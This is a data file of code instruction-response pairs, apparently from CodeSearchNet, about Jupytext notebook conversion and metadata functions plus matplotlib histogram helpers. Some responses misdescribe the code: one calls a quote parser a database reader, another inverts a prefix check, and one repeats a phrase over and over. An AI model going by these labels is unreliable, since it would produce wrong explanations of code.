{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef is_magic(line, language, global_escape_flag=True):\n    if language in ['octave', 'matlab']:\n        return False\n    if _MAGIC_FORCE_ESC_RE.get(language, _MAGIC_FORCE_ESC_RE['python']).match(line):\n        return True\n    if not global_escape_flag or _MAGIC_NOT_ESC_RE.get(language, _MAGIC_NOT_ESC_RE['python']).match(line):\n        return False\n    if _MAGIC_RE.get(language, _MAGIC_RE['python']).match(line):\n        return True\n    if language != 'python':\n        return False\n    if _PYTHON_HELP_OR_BASH_CMD.match(line):\n        return True\n    return _PYTHON_MAGIC_CMD.match(line)", "response": "Is the current line a Jupyter magic and should it be commented?"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef comment_magic(source, language='python', global_escape_flag=True):\n    parser = StringParser(language)\n    next_is_magic = False\n    for pos, line in enumerate(source):\n        if not parser.is_quoted() and (next_is_magic or is_magic(line, language, global_escape_flag)):\n            source[pos] = _COMMENT[language] + ' ' + line\n            next_is_magic = language == 'python' and _LINE_CONTINUATION_RE.match(line)\n        parser.read_line(line)\n    return source", "response": "Escape Jupyter magics with '# \"'"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nescapes code start with '#", "response": "def escape_code_start(source, ext, language='python'):\n    \"\"\"Escape code start with '# '\"\"\"\n    parser = StringParser(language)\n    for pos, line in enumerate(source):\n        if not parser.is_quoted() and is_escaped_code_start(line, ext):\n            source[pos] = _SCRIPT_EXTENSIONS.get(ext, {}).get('comment', '#') + ' ' + line\n        parser.read_line(line)\n    return source"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the metadata filter represented as a dictionary.", "response": "def metadata_filter_as_dict(metadata_config):\n    \"\"\"Return the metadata filter represented as either None (no filter),\n    or a dictionary with at most two keys: 'additional' and 'excluded',\n    which contain either a list of metadata names, or the string 'all'\"\"\"\n\n    if metadata_config is None:\n        return {}\n\n    if metadata_config is True:\n        return {'additional': 'all'}\n\n    if metadata_config is False:\n        return {'excluded': 'all'}\n\n    if isinstance(metadata_config, dict):\n        assert set(metadata_config) <= set(['additional', 'excluded'])\n        return metadata_config\n\n    metadata_keys = metadata_config.split(',')\n\n    metadata_config = {}\n\n    for key in metadata_keys:\n        key = key.strip()\n        if key.startswith('-'):\n            metadata_config.setdefault('excluded', []).append(key[1:].strip())\n        elif key.startswith('+'):\n            metadata_config.setdefault('additional', []).append(key[1:].strip())\n        else:\n            metadata_config.setdefault('additional', []).append(key)\n\n    for section in metadata_config:\n        if 'all' in metadata_config[section]:\n            metadata_config[section] = 'all'\n        else:\n            metadata_config[section] = [key for key in metadata_config[section] if key]\n\n    return metadata_config"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nconverting a filter represented as a dictionary with additional and excluded entries to a string", "response": "def metadata_filter_as_string(metadata_filter):\n    \"\"\"Convert a filter, represented as a dictionary with 'additional' and 'excluded' entries, to a string\"\"\"\n    if not isinstance(metadata_filter, dict):\n        return metadata_filter\n\n    additional = metadata_filter.get('additional', [])\n    if additional == 'all':\n        entries = ['all']\n    else:\n        entries = [key for key in additional if key not in _JUPYTEXT_CELL_METADATA]\n\n    excluded = metadata_filter.get('excluded', [])\n    if excluded == 'all':\n        entries.append('-all')\n    else:\n        entries.extend(['-' + e for e in excluded])\n\n    return ','.join(entries)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nupdate or set the notebook and cell metadata filters", "response": "def update_metadata_filters(metadata, jupyter_md, cell_metadata):\n    \"\"\"Update or set the notebook and cell metadata filters\"\"\"\n\n    cell_metadata = [m for m in cell_metadata if m not in ['language', 'magic_args']]\n\n    if 'cell_metadata_filter' in metadata.get('jupytext', {}):\n        metadata_filter = metadata_filter_as_dict(metadata.get('jupytext', {})['cell_metadata_filter'])\n        if isinstance(metadata_filter.get('excluded'), list):\n            metadata_filter['excluded'] = [key for key in metadata_filter['excluded'] if key not in cell_metadata]\n        metadata_filter.setdefault('additional', [])\n        if isinstance(metadata_filter.get('additional'), list):\n            for key in cell_metadata:\n                if key not in metadata_filter['additional']:\n                    metadata_filter['additional'].append(key)\n        metadata.setdefault('jupytext', {})['cell_metadata_filter'] = metadata_filter_as_string(metadata_filter)\n\n    if not jupyter_md:\n        # Set a metadata filter equal to the current metadata in script\n        cell_metadata = {'additional': cell_metadata, 'excluded': 'all'}\n        metadata.setdefault('jupytext', {})['notebook_metadata_filter'] = '-all'\n        metadata.setdefault('jupytext', {})['cell_metadata_filter'] = metadata_filter_as_string(cell_metadata)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\napply the filter and replace all with the actual or filtered keys", "response": "def apply_metadata_filters(user_filter, default_filter, actual_keys):\n    \"\"\"Apply the filter and replace 'all' with the actual or filtered keys\"\"\"\n\n    default_filter = metadata_filter_as_dict(default_filter) or {}\n    user_filter = metadata_filter_as_dict(user_filter) or {}\n\n    for key in ['additional', 'excluded']:\n        default_filter.setdefault(key, [])\n        user_filter.setdefault(key, [])\n\n    if user_filter.get('excluded') == 'all':\n        default_filter['additional'] = []\n    if user_filter.get('additional') == 'all':\n        default_filter['excluded'] = []\n\n    # notebook default filter = only few metadata\n    if default_filter.get('additional'):\n        if user_filter.get('additional') == 'all':\n            return actual_keys.difference(user_filter.get('excluded'))\n\n        return (actual_keys\n                .intersection(set(user_filter.get('additional')).union(default_filter.get('additional')))\n                .difference(user_filter.get('excluded')))\n\n    # cell default filter = all metadata but removed ones\n    if user_filter.get('excluded') == 'all':\n        return actual_keys.intersection(user_filter.get('additional'))\n\n    return (actual_keys.difference(\n        set(user_filter.get('excluded')).union(set(default_filter.get('excluded'))\n                                               .difference(user_filter.get('additional')))))"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nfilter the cell or notebook metadata according to the user preference", "response": "def filter_metadata(metadata, user_filter, default_filter):\n    \"\"\"Filter the cell or notebook metadata, according to the user preference\"\"\"\n    actual_keys = set(metadata.keys())\n    keep_keys = apply_metadata_filters(user_filter, default_filter, actual_keys)\n\n    for key in actual_keys:\n        if key not in keep_keys:\n            metadata.pop(key)\n\n    return metadata"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the default language given the notebook metadata and a file extension", "response": "def default_language_from_metadata_and_ext(metadata, ext):\n    \"\"\"Return the default language given the notebook metadata, and a file extension\"\"\"\n    default_from_ext = _SCRIPT_EXTENSIONS.get(ext, {}).get('language', 'python')\n\n    language = (metadata.get('jupytext', {}).get('main_language')\n                or metadata.get('kernelspec', {}).get('language')\n                or default_from_ext)\n\n    if language.startswith('C++'):\n        language = 'c++'\n\n    return language"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef set_main_and_cell_language(metadata, cells, ext):\n    main_language = (metadata.get('kernelspec', {}).get('language') or\n                     metadata.get('jupytext', {}).get('main_language') or\n                     _SCRIPT_EXTENSIONS.get(ext, {}).get('language'))\n\n    if main_language is None:\n        languages = {'python': 0.5}\n        for cell in cells:\n            if 'language' in cell['metadata']:\n                language = cell['metadata']['language']\n                languages[language] = languages.get(language, 0.0) + 1\n\n        main_language = max(languages, key=languages.get)\n\n    # save main language when no kernel is set\n    if 'language' not in metadata.get('kernelspec', {}):\n        metadata.setdefault('jupytext', {})['main_language'] = main_language\n\n    # Remove 'language' meta data and add a magic if not main language\n    for cell in cells:\n        if 'language' in cell['metadata']:\n            language = cell['metadata'].pop('language')\n            if language != main_language and language in _JUPYTER_LANGUAGES:\n                if 'magic_args' in cell['metadata']:\n                    magic_args = cell['metadata'].pop('magic_args')\n                    cell['source'] = u'%%{} {}\\n'.format(language, magic_args) + cell['source']\n                else:\n                    cell['source'] = u'%%{}\\n'.format(language) + cell['source']", "response": "Set main language for the given collection of cells and cell language for the given extension."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning cell language and language options if any", "response": "def cell_language(source):\n    \"\"\"Return cell language and language options, if any\"\"\"\n    if source:\n        line = source[0]\n        if line.startswith('%%'):\n            magic = line[2:]\n            if ' ' in magic:\n                lang, magic_args = magic.split(' ', 1)\n            else:\n                lang = magic\n                magic_args = ''\n\n            if lang in _JUPYTER_LANGUAGES:\n                source.pop(0)\n                return lang, magic_args\n\n    return None, None"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreading a new line from the database.", "response": "def read_line(self, line):\n        \"\"\"Read a new line\"\"\"\n        if self.ignore:\n            return\n\n        for i, char in enumerate(line):\n            if char not in ['\"', \"'\"]:\n                continue\n            # Is the char escaped?\n            if line[i - 1:i] == '\\\\':\n                continue\n\n            if self.single == char:\n                self.single = None\n                continue\n            if self.single is not None:\n                continue\n\n            if not self.python:\n                continue\n\n            if self.triple == char:\n                if line[i - 2:i + 1] == 3 * char:\n                    self.triple = None\n                    continue\n            if self.triple is not None:\n                continue\n            if line[i - 2:i + 1] == 3 * char:\n                self.triple = char\n                continue\n            self.single = char\n\n        # Line ended\n        if self.python:\n            self.single = None"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef filled_hist(ax, edges, values, bottoms=None, orientation='v',\n                **kwargs):\n    \"\"\"\n    Draw a histogram as a stepped patch.\n\n    Extra kwargs are passed through to `fill_between`\n\n    Parameters\n    ----------\n    ax : Axes\n        The axes to plot to\n\n    edges : array\n        A length n+1 array giving the left edges of each bin and the\n        right edge of the last bin.\n\n    values : array\n        A length n array of bin counts or values\n\n    bottoms : scalar or array, optional\n        A length n array of the bottom of the bars.  If None, zero is used.\n\n    orientation : {'v', 'h'}\n       Orientation of the histogram.  'v' (default) has\n       the bars increasing in the positive y-direction.\n\n    Returns\n    -------\n    ret : PolyCollection\n        Artist added to the Axes\n    \"\"\"\n    print(orientation)\n    if orientation not in set('hv'):\n        raise ValueError(\"orientation must be in {{'h', 'v'}} \"\n                         \"not {o}\".format(o=orientation))\n\n    kwargs.setdefault('step', 'post')\n    edges = np.asarray(edges)\n    values = np.asarray(values)\n    if len(edges) - 1 != len(values):\n        raise ValueError('Must provide one more bin edge than value not: '\n                         'len(edges): {lb} len(values): {lv}'.format(\n                             lb=len(edges), lv=len(values)))\n\n    if bottoms is None:\n        bottoms = np.zeros_like(values)\n    if np.isscalar(bottoms):\n        bottoms = np.ones_like(values) * bottoms\n\n    values = np.r_[values, values[-1]]\n    bottoms = np.r_[bottoms, bottoms[-1]]\n    if orientation == 'h':\n        return ax.fill_betweenx(edges, values, bottoms,\n                                **kwargs)\n    elif orientation == 'v':\n        return ax.fill_between(edges, values, bottoms,\n                               **kwargs)\n    else:\n        raise AssertionError(\"you should never be here\")", "response": "Draw a histogram as a stepped patch."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef stack_hist(ax, stacked_data, sty_cycle, bottoms=None,\n               hist_func=None, labels=None,\n               plot_func=None, plot_kwargs=None):\n    \"\"\"\n    ax : axes.Axes\n        The axes to add artists too\n\n    stacked_data : array or Mapping\n        A (N, M) shaped array.  The first dimension will be iterated over to\n        compute histograms row-wise\n\n    sty_cycle : Cycler or operable of dict\n        Style to apply to each set\n\n    bottoms : array, optional\n        The initial positions of the bottoms, defaults to 0\n\n    hist_func : callable, optional\n        Must have signature `bin_vals, bin_edges = f(data)`.\n        `bin_edges` expected to be one longer than `bin_vals`\n\n    labels : list of str, optional\n        The label for each set.\n\n        If not given and stacked data is an array defaults to 'default set {n}'\n\n        If stacked_data is a mapping, and labels is None, default to the keys\n        (which may come out in a random order).\n\n        If stacked_data is a mapping and labels is given then only\n        the columns listed by be plotted.\n\n    plot_func : callable, optional\n        Function to call to draw the histogram must have signature:\n\n          ret = plot_func(ax, edges, top, bottoms=bottoms,\n                          label=label, **kwargs)\n\n    plot_kwargs : dict, optional\n        Any extra kwargs to pass through to the plotting function.  This\n        will be the same for all calls to the plotting function and will\n        over-ride the values in cycle.\n\n    Returns\n    -------\n    arts : dict\n        Dictionary of artists keyed on their labels\n    \"\"\"\n    # deal with default binning function\n    if hist_func is None:\n        hist_func = np.histogram\n\n    # deal with default plotting function\n    if plot_func is None:\n        plot_func = filled_hist\n\n    # deal with default\n    if plot_kwargs is None:\n        plot_kwargs = {}\n    print(plot_kwargs)\n    try:\n        l_keys = stacked_data.keys()\n        label_data = True\n        if labels is None:\n            labels = l_keys\n\n    except AttributeError:\n        label_data = False\n        if labels is None:\n            labels = itertools.repeat(None)\n\n    if label_data:\n        loop_iter = enumerate((stacked_data[lab], lab, s) for lab, s in\n                              zip(labels, sty_cycle))\n    else:\n        loop_iter = enumerate(zip(stacked_data, labels, sty_cycle))\n\n    arts = {}\n    for j, (data, label, sty) in loop_iter:\n        if label is None:\n            label = 'dflt set {n}'.format(n=j)\n        label = sty.pop('label', label)\n        vals, edges = hist_func(data)\n        if bottoms is None:\n            bottoms = np.zeros_like(vals)\n        top = bottoms + vals\n        print(sty)\n        sty.update(plot_kwargs)\n        print(sty)\n        ret = plot_func(ax, edges, top, bottoms=bottoms,\n                        label=label, **sty)\n        bottoms = top\n        arts[label] = ret\n    ax.legend(fontsize=10)\n    return arts", "response": "This function creates a new histogram for the given data."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nload the contents manager and components for the current server extension.", "response": "def load_jupyter_server_extension(app):  # pragma: no cover\n    \"\"\"Use Jupytext's contents manager\"\"\"\n    if isinstance(app.contents_manager_class, TextFileContentsManager):\n        app.log.info(\"[Jupytext Server Extension] NotebookApp.contents_manager_class is \"\n                     \"(a subclass of) jupytext.TextFileContentsManager already - OK\")\n        return\n\n    # The server extension call is too late!\n    # The contents manager was set at NotebookApp.init_configurables\n\n    # Let's change the contents manager class\n    app.log.info('[Jupytext Server Extension] Changing NotebookApp.contents_manager_class '\n                 'from {} to jupytext.TextFileContentsManager'.format(app.contents_manager_class.__name__))\n    app.contents_manager_class = TextFileContentsManager\n\n    try:\n        # And rerun selected init steps from https://github.com/jupyter/notebook/blob/\n        # 132f27306522b32fa667a6b208034cb7a04025c9/notebook/notebookapp.py#L1634-L1638\n\n        # app.init_configurables()\n        app.contents_manager = app.contents_manager_class(parent=app, log=app.log)\n        app.session_manager.contents_manager = app.contents_manager\n\n        # app.init_components()\n        # app.init_webapp()\n        app.web_app.settings['contents_manager'] = app.contents_manager\n\n        # app.init_terminals()\n        # app.init_signal()\n\n    except Exception:\n        app.log.error(\"\"\"[Jupytext Server Extension] An error occured. Please deactivate the server extension with\n    jupyter serverextension disable jupytext\nand configure the contents manager manually by adding\n    c.NotebookApp.contents_manager_class = \"jupytext.TextFileContentsManager\"\nto your .jupyter/jupyter_notebook_config.py file.\n\"\"\")\n        raise"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreading a notebook from a string", "response": "def reads(text, fmt, as_version=4, **kwargs):\n    \"\"\"Read a notebook from a string\"\"\"\n    fmt = copy(fmt)\n    fmt = long_form_one_format(fmt)\n    ext = fmt['extension']\n\n    if ext == '.ipynb':\n        return nbformat.reads(text, as_version, **kwargs)\n\n    format_name = read_format_from_metadata(text, ext) or fmt.get('format_name')\n\n    if format_name:\n        format_options = {}\n    else:\n        format_name, format_options = guess_format(text, ext)\n\n    if format_name:\n        fmt['format_name'] = format_name\n\n    fmt.update(format_options)\n    reader = TextNotebookConverter(fmt)\n    notebook = reader.reads(text, **kwargs)\n    rearrange_jupytext_metadata(notebook.metadata)\n\n    if format_name and insert_or_test_version_number():\n        notebook.metadata.setdefault('jupytext', {}).setdefault('text_representation', {}).update(\n            {'extension': ext, 'format_name': format_name})\n\n    return notebook"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreads a notebook from a file", "response": "def read(file_or_stream, fmt, as_version=4, **kwargs):\n    \"\"\"Read a notebook from a file\"\"\"\n    fmt = long_form_one_format(fmt)\n    if fmt['extension'] == '.ipynb':\n        notebook = nbformat.read(file_or_stream, as_version, **kwargs)\n        rearrange_jupytext_metadata(notebook.metadata)\n        return notebook\n\n    return reads(file_or_stream.read(), fmt, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef readf(nb_file, fmt=None):\n    if nb_file == '-':\n        text = sys.stdin.read()\n        fmt = fmt or divine_format(text)\n        return reads(text, fmt)\n\n    _, ext = os.path.splitext(nb_file)\n    fmt = copy(fmt or {})\n    fmt.update({'extension': ext})\n    with io.open(nb_file, encoding='utf-8') as stream:\n        return read(stream, fmt, as_version=4)", "response": "Read a notebook from the file with given name"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nwrites a notebook to a string", "response": "def writes(notebook, fmt, version=nbformat.NO_CONVERT, **kwargs):\n    \"\"\"Write a notebook to a string\"\"\"\n    metadata = deepcopy(notebook.metadata)\n    rearrange_jupytext_metadata(metadata)\n    fmt = copy(fmt)\n    fmt = long_form_one_format(fmt, metadata)\n    ext = fmt['extension']\n    format_name = fmt.get('format_name')\n\n    jupytext_metadata = metadata.get('jupytext', {})\n\n    if ext == '.ipynb':\n        # Remove jupytext section if empty\n        jupytext_metadata.pop('text_representation', {})\n        if not jupytext_metadata:\n            metadata.pop('jupytext', {})\n        return nbformat.writes(new_notebook(cells=notebook.cells, metadata=metadata), version, **kwargs)\n\n    if not format_name:\n        format_name = format_name_for_ext(metadata, ext, explicit_default=False)\n\n    if format_name:\n        fmt['format_name'] = format_name\n        update_jupytext_formats_metadata(metadata, fmt)\n\n    writer = TextNotebookConverter(fmt)\n    return writer.writes(notebook, metadata)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef write(notebook, file_or_stream, fmt, version=nbformat.NO_CONVERT, **kwargs):\n    # Python 2 compatibility\n    text = u'' + writes(notebook, fmt, version, **kwargs)\n    file_or_stream.write(text)\n    # Add final newline #165\n    if not text.endswith(u'\\n'):\n        file_or_stream.write(u'\\n')", "response": "Write a notebook to a file"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nwrite a notebook to the file with given name", "response": "def writef(notebook, nb_file, fmt=None):\n    \"\"\"Write a notebook to the file with given name\"\"\"\n    if nb_file == '-':\n        write(notebook, sys.stdout, fmt)\n        return\n\n    _, ext = os.path.splitext(nb_file)\n    fmt = copy(fmt or {})\n    fmt = long_form_one_format(fmt, update={'extension': ext})\n\n    create_prefix_dir(nb_file, fmt)\n\n    with io.open(nb_file, 'w', encoding='utf-8') as stream:\n        write(notebook, stream, fmt)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncreates directory if no prefix exists", "response": "def create_prefix_dir(nb_file, fmt):\n    \"\"\"Create directory if fmt has a prefix\"\"\"\n    if 'prefix' in fmt:\n        nb_dir = os.path.dirname(nb_file) + os.path.sep\n        if not os.path.isdir(nb_dir):\n            logging.log(logging.WARNING, \"[jupytext] creating missing directory %s\", nb_dir)\n            os.makedirs(nb_dir)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nupdates the format options with the values in the notebook metadata and record those those options in the notebook metadata", "response": "def update_fmt_with_notebook_options(self, metadata):\n        \"\"\"Update format options with the values in the notebook metadata, and record those\n        options in the notebook metadata\"\"\"\n        # format options in notebook have precedence over that in fmt\n        for opt in _VALID_FORMAT_OPTIONS:\n            if opt in metadata.get('jupytext', {}):\n                self.fmt.setdefault(opt, metadata['jupytext'][opt])\n            if opt in self.fmt:\n                metadata.setdefault('jupytext', {}).setdefault(opt, self.fmt[opt])\n\n        # rST to md conversion should happen only once\n        if metadata.get('jupytext', {}).get('rst2md') is True:\n            metadata['jupytext']['rst2md'] = False"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreading a notebook represented as text", "response": "def reads(self, s, **_):\n        \"\"\"Read a notebook represented as text\"\"\"\n        if self.fmt.get('format_name') == 'pandoc':\n            return md_to_notebook(s)\n\n        lines = s.splitlines()\n\n        cells = []\n        metadata, jupyter_md, header_cell, pos = header_to_metadata_and_cell(lines,\n                                                                             self.implementation.header_prefix,\n                                                                             self.implementation.extension)\n        default_language = default_language_from_metadata_and_ext(metadata, self.implementation.extension)\n        self.update_fmt_with_notebook_options(metadata)\n\n        if header_cell:\n            cells.append(header_cell)\n\n        lines = lines[pos:]\n\n        if self.implementation.format_name and self.implementation.format_name.startswith('sphinx'):\n            cells.append(new_code_cell(source='%matplotlib inline'))\n\n        cell_metadata = set()\n\n        while lines:\n            reader = self.implementation.cell_reader_class(self.fmt, default_language)\n            cell, pos = reader.read(lines)\n            cells.append(cell)\n            cell_metadata.update(cell.metadata.keys())\n            if pos <= 0:\n                raise Exception('Blocked at lines ' + '\\n'.join(lines[:6]))  # pragma: no cover\n            lines = lines[pos:]\n\n        update_metadata_filters(metadata, jupyter_md, cell_metadata)\n        set_main_and_cell_language(metadata, cells, self.implementation.extension)\n\n        if self.implementation.format_name and self.implementation.format_name.startswith('sphinx'):\n            filtered_cells = []\n            for i, cell in enumerate(cells):\n                if cell.source == '' and i > 0 and i + 1 < len(cells) \\\n                        and cells[i - 1].cell_type != 'markdown' and cells[i + 1].cell_type != 'markdown':\n                    continue\n                filtered_cells.append(cell)\n            cells = filtered_cells\n\n        return new_notebook(cells=cells, metadata=metadata)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the text representation of the notebook", "response": "def writes(self, nb, metadata=None, **kwargs):\n        \"\"\"Return the text representation of the notebook\"\"\"\n        if self.fmt.get('format_name') == 'pandoc':\n            metadata = insert_jupytext_info_and_filter_metadata(metadata, self.ext, self.implementation)\n\n            cells = []\n            for cell in nb.cells:\n                cell_metadata = filter_metadata(copy(cell.metadata),\n                                                self.fmt.get('cell_metadata_filter'),\n                                                _IGNORE_CELL_METADATA)\n                if cell.cell_type == 'code':\n                    cells.append(new_code_cell(source=cell.source, metadata=cell_metadata))\n                else:\n                    cells.append(NotebookNode(source=cell.source, metadata=cell_metadata, cell_type=cell.cell_type))\n\n            return notebook_to_md(new_notebook(metadata=metadata, cells=cells))\n\n        # Copy the notebook, in order to be sure we do not modify the original notebook\n        nb = new_notebook(cells=nb.cells, metadata=deepcopy(metadata or nb.metadata))\n        metadata = nb.metadata\n        default_language = default_language_from_metadata_and_ext(metadata, self.implementation.extension)\n        self.update_fmt_with_notebook_options(nb.metadata)\n\n        if 'main_language' in metadata.get('jupytext', {}):\n            del metadata['jupytext']['main_language']\n\n        header = encoding_and_executable(nb, metadata, self.ext)\n        header_content, header_lines_to_next_cell = metadata_and_cell_to_header(nb, metadata,\n                                                                                self.implementation, self.ext)\n        header.extend(header_content)\n\n        cell_exporters = []\n        looking_for_first_markdown_cell = (self.implementation.format_name and\n                                           self.implementation.format_name.startswith('sphinx'))\n        split_at_heading = self.fmt.get('split_at_heading', False)\n\n        for cell in nb.cells:\n            if looking_for_first_markdown_cell and cell.cell_type == 'markdown':\n                cell.metadata.setdefault('cell_marker', '\"\"\"')\n                looking_for_first_markdown_cell = False\n\n            cell_exporters.append(self.implementation.cell_exporter_class(cell, default_language, self.fmt))\n\n        texts = [cell.cell_to_text() for cell in cell_exporters]\n        lines = []\n\n        # concatenate cells in reverse order to determine how many blank lines (pep8)\n        for i, cell in reversed(list(enumerate(cell_exporters))):\n            text = cell.remove_eoc_marker(texts[i], lines)\n\n            if i == 0 and self.implementation.format_name and \\\n                    self.implementation.format_name.startswith('sphinx') and \\\n                    (text in [['%matplotlib inline'], ['# %matplotlib inline']]):\n                continue\n\n            lines_to_next_cell = cell.lines_to_next_cell\n            if lines_to_next_cell is None:\n                lines_to_next_cell = pep8_lines_between_cells(text, lines, self.implementation.extension)\n\n            text.extend([''] * lines_to_next_cell)\n\n            # two blank lines between markdown cells in Rmd when those do not have explicit region markers\n            if self.ext in ['.Rmd', '.md'] and not cell.is_code():\n                if (i + 1 < len(cell_exporters) and not cell_exporters[i + 1].is_code() and\n                        not texts[i][0].startswith('<!-- #region') and\n                        not texts[i + 1][0].startswith('<!-- #region') and\n                        (not split_at_heading or not (texts[i + 1] and texts[i + 1][0].startswith('#')))):\n                    text.append('')\n\n            # \"\" between two consecutive code cells in sphinx\n            if self.implementation.format_name.startswith('sphinx') and cell.is_code():\n                if i + 1 < len(cell_exporters) and cell_exporters[i + 1].is_code():\n                    text.append('\"\"')\n\n            if i + 1 < len(cell_exporters):\n                lines = cell_exporters[i + 1].simplify_soc_marker(lines, text)\n            lines = text + lines\n\n        if header_lines_to_next_cell is None:\n            header_lines_to_next_cell = pep8_lines_between_cells(header_content, lines, self.implementation.extension)\n\n        header.extend([''] * header_lines_to_next_cell)\n\n        if cell_exporters:\n            lines = cell_exporters[0].simplify_soc_marker(lines, header)\n\n        return '\\n'.join(header + lines)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef uncomment_line(line, prefix):\n    if not prefix:\n        return line\n    if line.startswith(prefix + ' '):\n        return line[len(prefix) + 1:]\n    if line.startswith(prefix):\n        return line[len(prefix):]\n    return line", "response": "Remove prefix and space from line"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef encoding_and_executable(notebook, metadata, ext):\n    lines = []\n    comment = _SCRIPT_EXTENSIONS.get(ext, {}).get('comment')\n    jupytext_metadata = metadata.get('jupytext', {})\n\n    if ext not in ['.Rmd', '.md'] and 'executable' in jupytext_metadata:\n        lines.append(comment + '!' + jupytext_metadata.pop('executable'))\n\n    if 'encoding' in jupytext_metadata:\n        lines.append(jupytext_metadata.pop('encoding'))\n    elif ext not in ['.Rmd', '.md']:\n        for cell in notebook.cells:\n            try:\n                cell.source.encode('ascii')\n            except (UnicodeEncodeError, UnicodeDecodeError):\n                lines.append(comment + _UTF8_HEADER)\n                break\n\n    return lines", "response": "Return the encoding and executable lines for a notebook if applicable"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ninserts Jupytext information into the notebook metadata.", "response": "def insert_jupytext_info_and_filter_metadata(metadata, ext, text_format):\n    \"\"\"Update the notebook metadata to include Jupytext information, and filter\n    the notebook metadata according to the default or user filter\"\"\"\n    if insert_or_test_version_number():\n        metadata.setdefault('jupytext', {})['text_representation'] = {\n            'extension': ext,\n            'format_name': text_format.format_name,\n            'format_version': text_format.current_version_number,\n            'jupytext_version': __version__}\n\n    if 'jupytext' in metadata and not metadata['jupytext']:\n        del metadata['jupytext']\n\n    notebook_metadata_filter = metadata.get('jupytext', {}).get('notebook_metadata_filter')\n    return filter_metadata(metadata, notebook_metadata_filter, _DEFAULT_NOTEBOOK_METADATA)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef metadata_and_cell_to_header(notebook, metadata, text_format, ext):\n\n    header = []\n\n    lines_to_next_cell = None\n    if notebook.cells:\n        cell = notebook.cells[0]\n        if cell.cell_type == 'raw':\n            lines = cell.source.strip('\\n\\t ').splitlines()\n            if len(lines) >= 2 \\\n                    and _HEADER_RE.match(lines[0]) \\\n                    and _HEADER_RE.match(lines[-1]):\n                header = lines[1:-1]\n                lines_to_next_cell = cell.metadata.get('lines_to_next_cell')\n                notebook.cells = notebook.cells[1:]\n\n    metadata = insert_jupytext_info_and_filter_metadata(metadata, ext, text_format)\n\n    if metadata:\n        header.extend(yaml.safe_dump({'jupyter': metadata}, default_flow_style=False).splitlines())\n\n    if header:\n        header = ['---'] + header + ['---']\n\n    return comment_lines(header, text_format.header_prefix), lines_to_next_cell", "response": "Return the text header corresponding to a notebook and remove the header corresponding to a notebook and remove the header corresponding to a notebook and remove the header corresponding to the notebook if it contained the header."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef header_to_metadata_and_cell(lines, header_prefix, ext=None):\n\n    header = []\n    jupyter = []\n    injupyter = False\n    ended = False\n    metadata = {}\n    start = 0\n    i = -1\n\n    comment = '#' if header_prefix == \"#'\" else header_prefix\n\n    encoding_re = re.compile(r'^[ \\t\\f]*{}.*?coding[:=][ \\t]*([-_.a-zA-Z0-9]+)'.format(comment))\n\n    for i, line in enumerate(lines):\n        if i == 0 and line.startswith(comment + '!'):\n            metadata.setdefault('jupytext', {})['executable'] = line[2:]\n            start = i + 1\n            continue\n        if i == 0 or (i == 1 and not encoding_re.match(lines[0])):\n            encoding = encoding_re.match(line)\n            if encoding:\n                if encoding.group(1) != 'utf-8':\n                    raise ValueError('Encodings other than utf-8 are not supported')\n                metadata.setdefault('jupytext', {})['encoding'] = line\n                start = i + 1\n                continue\n\n        if not line.startswith(header_prefix):\n            break\n\n        line = uncomment_line(line, header_prefix)\n\n        if i == start:\n            if _HEADER_RE.match(line):\n                continue\n            else:\n                break\n\n        if i > start and _HEADER_RE.match(line):\n            ended = True\n            break\n\n        if _JUPYTER_RE.match(line):\n            injupyter = True\n        elif not _LEFTSPACE_RE.match(line):\n            injupyter = False\n\n        if injupyter:\n            jupyter.append(line)\n        else:\n            header.append(line)\n\n    if ended:\n        if jupyter:\n            metadata.update(yaml.safe_load('\\n'.join(jupyter))['jupyter'])\n\n        lines_to_next_cell = 1\n        if len(lines) > i + 1:\n            line = uncomment_line(lines[i + 1], header_prefix)\n            if not _BLANK_RE.match(line):\n                lines_to_next_cell = 0\n            else:\n                i = i + 1\n        else:\n            lines_to_next_cell = 0\n\n        if header:\n            cell = new_raw_cell(source='\\n'.join(['---'] + header + ['---']),\n                                metadata={} if lines_to_next_cell == pep8_lines_between_cells(\n                                    ['---'], lines[i + 1:], ext) else {'lines_to_next_cell': lines_to_next_cell})\n        else:\n            cell = None\n\n        return metadata, jupyter, cell, i + 1\n\n    return metadata, False, None, start", "response": "Return the metadata and cell of a jupyter notebook header."}
